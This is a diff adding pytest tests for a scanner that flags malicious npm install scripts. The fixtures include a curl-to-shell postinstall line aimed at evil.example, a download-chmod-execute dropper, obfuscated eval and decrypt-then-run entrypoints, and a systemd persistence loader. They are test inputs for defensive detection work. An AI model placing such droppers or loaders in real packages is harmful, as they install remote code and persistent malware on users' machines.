@@ -109,3 +109,176 @@ def test_node_modules_manifest_ignored(tmp_path):
     (dep / "package.json").write_text(json.dumps(
         {"name": "evil", "scripts": {"postinstall": "curl http://evil.example | sh -c cat"}}))
     assert analyze_install_scripts(root) == []
+
+
+# --- Remote-binary dropper (download -> write -> chmod-exec), host-aware ---
+
+_DROPPER_JS = """
+const https = require('https');
+const fs = require('fs');
+const { execSync } = require('child_process');
+const URL = '__HOST__/download/veteran/v1.0.2/veteran_linux_amd64.tar.gz';
+function dl(u, dest) {
+  const file = fs.createWriteStream(dest);
+  https.get(u, (res) => { res.pipe(file); });
+}
+dl(URL, '/tmp/bin');
+fs.chmodSync('/tmp/bin', 0o755);
+execSync('/tmp/bin version');
+"""
+
+
+def _dropper(host: str) -> str:
+    return _DROPPER_JS.replace("__HOST__", host)
+
+
+def test_dropper_untrusted_host_high(tmp_path):
+    # veteran-style: repo claims github, binary pulled from an unrelated host.
+    root = _write_pkg(
+        tmp_path,
+        {"name": "veteran", "version": "1.0.10",
+         "repository": {"type": "git", "url": "git+https://github.com/veteran-cli/veteran.git"},
+         "scripts": {"postinstall": "node install.js"}},
+        {"install.js": _dropper("https://laogou.us")},
+    )
+    f = analyze_install_scripts(root)
+    drop = [x for x in f if x.rule_id == "installer.npm_install_remote_binary_drop"]
+    assert len(drop) == 1 and drop[0].severity == "high"
+    assert "laogou.us" in drop[0].evidence
+
+
+def test_dropper_from_declared_repo_host_not_flagged(tmp_path):
+    # downloading the binary from the package's OWN github repo = native-wrapper norm
+    root = _write_pkg(
+        tmp_path,
+        {"name": "mytool", "version": "1.0.0",
+         "repository": {"url": "https://github.com/myorg/mytool"},
+         "scripts": {"postinstall": "node install.js"}},
+        {"install.js": _dropper("https://github.com/myorg/mytool/releases")},
+    )
+    f = analyze_install_scripts(root)
+    assert "installer.npm_install_remote_binary_drop" not in _rule_ids(f)
+
+
+def test_dropper_from_github_universal_not_flagged(tmp_path):
+    root = _write_pkg(
+        tmp_path,
+        {"name": "mytool", "version": "1.0.0",
+         "scripts": {"postinstall": "node install.js"}},
+        {"install.js": _dropper("https://objects.githubusercontent.com")},
+    )
+    f = analyze_install_scripts(root)
+    assert "installer.npm_install_remote_binary_drop" not in _rule_ids(f)
+
+
+def test_dropper_dynamic_url_medium(tmp_path):
+    js = (
+        "const https=require('https');const fs=require('fs');\n"
+        "const u=process.env.BASE+'/bin.tgz';\n"
+        "const f=fs.createWriteStream('/tmp/b');https.get(u,r=>r.pipe(f));\n"
+        "fs.chmodSync('/tmp/b',0o755);\n"
+    )
+    root = _write_pkg(
+        tmp_path,
+        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}},
+        {"install.js": js},
+    )
+    f = analyze_install_scripts(root)
+    drop = [x for x in f if x.rule_id == "installer.npm_install_remote_binary_drop"]
+    assert len(drop) == 1 and drop[0].severity == "medium"
+
+
+def test_download_without_chmod_not_a_dropper(tmp_path):
+    js = (
+        "const https=require('https');const fs=require('fs');\n"
+        "const f=fs.createWriteStream('/tmp/data.json');\n"
+        "https.get('https://laogou.us/data.json', r=>r.pipe(f));\n"
+    )
+    root = _write_pkg(
+        tmp_path,
+        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}},
+        {"install.js": js},
+    )
+    f = analyze_install_scripts(root)
+    assert "installer.npm_install_remote_binary_drop" not in _rule_ids(f)
+
+
+# --- obfuscated self-decoding entrypoint (@redhat-cloud-services worm, June 2026) ---
+
+def test_install_obfuscated_charcode_entrypoint_critical(tmp_path):
+    # preinstall runs a local script that Caesar(char-codes)->eval's its payload
+    js = ("try{eval(function(s,n){return s.replace(/[a-z]/g,c=>String.fromCharCode("
+          "(c.charCodeAt(0)-97+n)%26+97))}('ogmbq',12))}catch(e){}\n")
+    root = _write_pkg(
+        tmp_path,
+        {"name": "x", "version": "1.0.0", "scripts": {"preinstall": "node index.js"}},
+        {"index.js": js},
+    )
+    f = analyze_install_scripts(root)
+    obf = [x for x in f if x.rule_id == "installer.npm_install_obfuscated_entrypoint"]
+    assert len(obf) == 1 and obf[0].severity == "critical"
+
+
+def test_install_obfuscated_decrypt_entrypoint_critical(tmp_path):
+    js = ("const c=require('crypto');const d=c.createDecipheriv('aes-128-gcm',k,iv);"
+          "new Function(d.update(ct).toString())();\n")
+    root = _write_pkg(
+        tmp_path,
+        {"name": "x", "version": "1.0.0", "scripts": {"preinstall": "node index.js"}},
+        {"index.js": js},
+    )
+    assert "installer.npm_install_obfuscated_entrypoint" in _rule_ids(analyze_install_scripts(root))
+
+
+def test_benign_referenced_js_no_obfuscated_entrypoint(tmp_path):
+    js = "const cfg=require('./config.json');console.log(cfg.version);\n"
+    root = _write_pkg(
+        tmp_path,
+        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node setup.js"}},
+        {"setup.js": js},
+    )
+    assert "installer.npm_install_obfuscated_entrypoint" not in _rule_ids(analyze_install_scripts(root))
+
+
+# --- resident-agent loader (logger-active / utils-terminal stealer family) ---
+
+def test_install_persistence_loader_critical(tmp_path):
+    # postinstall loader: registers OS persistence AND detaches a bg process
+    js = (
+        "const {spawn}=require('child_process');const fs=require('fs');const path=require('path');\n"
+        "spawn(process.execPath,[__filename,'--bg'],{detached:true,stdio:'ignore'}).unref();\n"
+        "fs.writeFileSync(path.join(home,'.config','systemd','user','agent.service'), unit);\n"
+        "spawn('systemctl',['--user','enable','agent.service']);\n"
+    )
+    root = _write_pkg(
+        tmp_path,
+        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node utils.js"}},
+        {"utils.js": js},
+    )
+    pl = [x for x in analyze_install_scripts(root) if x.rule_id == "installer.npm_install_persistence_loader"]
+    assert len(pl) == 1 and pl[0].severity == "critical"
+
+
+def test_install_persistence_only_high(tmp_path):
+    js = "const fs=require('fs');fs.writeFileSync(home+'/Library/LaunchAgents/x.plist', p);\n"
+    root = _write_pkg(
+        tmp_path,
+        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node setup.js"}},
+        {"setup.js": js},
+    )
+    ids = _rule_ids(analyze_install_scripts(root))
+    assert "installer.npm_install_persistence" in ids
+    assert "installer.npm_install_persistence_loader" not in ids  # no detached spawn
+
+
+def test_benign_postinstall_no_persistence_findings(tmp_path):
+    js = "const cfg=require('./config.json');console.log(cfg.name);\n"
+    root = _write_pkg(
+        tmp_path,
+        {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node setup.js"}},
+        {"setup.js": js},
+    )
+    ids = _rule_ids(analyze_install_scripts(root))
+    assert not (ids & {"installer.npm_install_persistence_loader",
+                       "installer.npm_install_persistence",
+                       "installer.npm_install_detached_spawn"})
